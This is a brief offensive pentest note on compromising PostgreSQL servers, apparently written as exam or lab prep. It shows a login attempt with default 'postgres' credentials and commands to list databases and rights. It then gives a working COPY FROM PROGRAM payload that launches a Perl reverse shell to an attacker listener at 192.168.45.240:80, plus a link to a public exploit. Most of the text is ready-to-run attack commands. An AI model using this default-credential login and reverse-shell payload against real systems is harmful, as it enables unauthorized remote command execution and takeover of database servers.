# Postgres

- check if you can default login

```bash
psql -h 192.168.198.60 -p 5432 -U postgres #password can be postgres

# List database
\list

# list user rights
/du

# if superuser, you can get a revshell

postgres=# DROP TABLE IF EXISTS cmd_exec;
postgres=# CREATE TABLE cmd_exec(cmd_output text);

# open a listener to catch the below command


COPY cmd_exec FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.45.240:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';

```
Link here for the lazy way https://www.exploit-db.com/exploits/50847